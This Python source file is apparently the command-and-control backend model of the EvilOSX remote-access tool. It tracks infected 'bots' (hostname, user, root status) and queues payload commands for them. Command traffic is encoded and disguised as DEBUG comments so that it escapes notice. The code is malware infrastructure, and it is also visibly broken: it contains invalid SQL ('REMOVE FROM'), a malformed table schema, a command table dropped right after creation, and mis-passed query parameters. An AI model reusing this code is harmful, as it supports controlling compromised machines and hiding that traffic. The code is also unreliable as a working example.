# -*- coding: utf-8 -*-
"""Model which is used by the controller to interact with our backend database."""
__author__ = "Marten4n6"
__license__ = "GPLv3"

import sqlite3
from base64 import b64encode
from os import path
from threading import RLock
from zlib import compress

from Cryptodome.Hash import SHA256


class Bot:
    """This class represents a bot."""

    def __init__(self, uid, username, hostname, last_seen, system_version, is_root, local_path):
        """
        :type uid: str
        :type username: str
        :type hostname: str
        :type last_seen: float
        :type system_version: str
        :type is_root: bool
        :type local_path: str
        """
        self.uid = uid
        self.username = username
        self.hostname = hostname
        self.last_seen = last_seen
        self.system_version = system_version
        self.is_root = is_root
        self.local_path = local_path


class Command:
    """This class represents a command."""

    def __init__(self, bot_uid, payload, options):
        """
        :type bot_uid: str
        :type payload: str
        :type options: dict
        """
        self.bot_uid = bot_uid
        self.payload = payload
        self.options = options

    def get_network_format(self):
        """String representation of this class which can be sent over the network.

        The format is split up into two lines, one which contains the payload, the other the command's options.\n
        Each line is compressed and encoded with base64.\n
        These two lines are then encrypted and surrounded by DEBUG comments (from BlackHat's "Hiding In Plain Sight").

        :rtype: str
        """
        formatted = "<--DEBUG:\n"
        formatted += b64encode(compress(self.payload.encode())).decode() + "\n"
        formatted += b64encode(compress(str(self.options).encode())).decode() + "\n"
        formatted += "DEBUG-->"

        return formatted


class Model:
    """Thread-safe model which interacts with our database."""

    def __init__(self):
        self._database_path = path.join(path.dirname(__file__), path.pardir, "data", "EvilOSX.db")
        self._database = sqlite3.connect(self._database_path, check_same_thread=False)
        self._cursor = self._database.cursor()
        self._lock = RLock()  # We want all database operation to be synchronized.
        self._connected_bot = None

        # Create our tables.
        self._cursor.execute("CREATE TABLE IF NOT EXISTS settings("
                             "password text, inactive_time text)")
        self._cursor.execute("CREATE TABLE IF NOT EXISTS bots("
                             "bot_uid text, username text, hostname text, last_seen real, "
                             "system_version text is_root text, local_path text)")
        self._cursor.execute("CREATE TABLE IF NOT EXISTS commands("
                             "bot_uid text, raw_command text)")

        self._cursor.execute("DROP TABLE commands")

    def set_password(self, password):
        """Sets the master password used to authenticate with the UI.

        :type password: str
        """
        with self._lock:
            encrypted_password = SHA256.new(password.encode())

            self._cursor.execute("INSERT OR REPLACE INTO settings(password) VALUES (?)", encrypted_password.hexdigest())
            self._database.commit()

    def get_password(self):
        """
        :return: The master password which protects UI access.
        :rtype: str
        """
        with self._lock:
            response = self._cursor.execute("SELECT password FROM settings").fetchone()

            if not response:
                return None
            else:
                return response[0]

    def is_valid_password(self, password):
        """Checks if the given password matches the master password.

        :type password: str
        """
        master_password = self.get_password()

        if not master_password:
            return False
        else:
            return SHA256.new(password.encode()).hexdigest() == master_password

    def set_inactive_time(self, minutes):
        """Sets the time after which bots will be shown as offline.

        :type minutes: int
        """
        with self._lock:
            self._cursor.execute("INSERT OR REPLACE INTO settings(inactive_time) VALUES (?)", (minutes,))
            self._database.commit()

    def get_inactive_time(self):
        """
        :rtype: int
        :return: The time in minutes after which a bot will be shown as inactive.
        """
        with self._lock:
            inactive_time = self._cursor.execute("SELECT * FROM settings").fetchone()[1]

            if not inactive_time:
                # Return our default inactive time.
                return 3
            else:
                return inactive_time

    def add_bot(self, bot):
        """Inserts a bot into the database.

        :type bot: Bot
        """
        with self._lock:
            self._cursor.execute("INSERT INTO bots VALUES (?,?,?,?,?,?,?)", (
                bot.uid, bot.username, bot.hostname, bot.last_seen,
                bot.system_version, bot.is_root, bot.local_path
            ))
            self._database.commit()

    def remove_bot(self, bot_uid):
        """Removes a bot from the database.

        :type bot_uid: str
        """
        with self._lock:
            self._cursor.execute("REMOVE FROM bots WHERE bot_uid=?", (bot_uid,))
            self._database.commit()

    def is_known_bot(self, bot_uid):
        """
        :type bot_uid: str
        :return: True if a bot with the given UID exists in the database.
        """
        with self._lock:
            return self._cursor.execute("SELECT * FROM bots WHERE bot_uid=?", (bot_uid,)).fetchone()

    def set_connected_bot(self, bot):
        """Sets the bot to which the user is currently connected to.

        :type bot: Bot
        """
        self._connected_bot = bot

    def add_command(self, bot_uid, command):
        """Adds a command to the bot's queue.

        :type bot_uid: str
        :type command: Command
        """
        with self._lock:
            self._cursor.execute("INSERT INTO commands VALUES (?,?)", (bot_uid, str(command)))
            self._database.commit()

    def get_command(self, bot_uid):
        """Retrieves a pending command and removes it from the bot's queue.

        :type bot_uid: str
        """
        with self._lock:
            response = self._cursor.execute("SELECT * FROM commands WHERE bot_uid = ?", (bot_uid,)).fetchone()

            if not response:
                return ""
            else:
                self._remove_command(bot_uid)
                return response[1]

    def _remove_command(self, bot_uid):
        """Removes the first command in the bot's queue.

        :type bot_uid: str
        """
        with self._lock:
            # Workaround for https://sqlite.org/compile.html#enable_update_delete_limit
            self._cursor.execute("DELETE FROM commands WHERE rowid = "
                                 "(SELECT rowid FROM commands WHERE bot_uid = ? LIMIT 1)", (bot_uid,))
            self._database.commit()
